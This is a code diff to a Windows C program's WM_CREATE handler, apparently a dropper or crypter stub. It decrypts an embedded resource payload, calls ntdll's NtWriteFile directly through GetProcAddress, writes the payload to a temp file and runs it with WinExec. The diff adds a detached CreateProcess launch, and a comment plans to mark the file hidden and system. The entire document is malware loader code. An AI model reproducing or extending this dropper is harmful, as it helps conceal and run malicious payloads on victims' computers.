@@ -90,7 +90,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
     {
 		case WM_CREATE:
 		{	
-                                                                                                                                                                                                                                                                                                                                                                                                                                                        
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
 			// going extra low level because why the fuck not?
 			IO_STATUS_BLOCK blck;
 			typedef NTSTATUS (*_NtWriteFile)(
@@ -105,7 +105,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 			PULONG           Key);
 
 			_NtWriteFile NtWriteFile = (_NtWriteFile)GetProcAddress(LoadLibrary("ntdll.dll"), "NtWriteFile");
-			byte payload[rsrc_len] = decrypted(GetPayload(),rsrc_len, cryptokey);
+			byte *payload = decrypted(GetPayload(),rsrc_len, cryptokey);
 			char tempspace[512] = "";
 			char filename[1024] = "";
 			DWORD byteswritten = 0;
@@ -117,7 +117,9 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 			CloseHandle(tmphnd);
 			// CreateFile, WriteFile, then SetFileAttributes to hidden and system followed by shellexec or createprocess
 			WinExec(filename,0);
-			
+			STARTUPINFO si;
+			PROCESS_INFORMATION pi;
+			CreateProcess(filename,NULL,NULL,NULL,TRUE,DETACHED_PROCESS,NULL,tempspace,&si,&pi);
 		}
 		break;
         case WM_CLOSE:
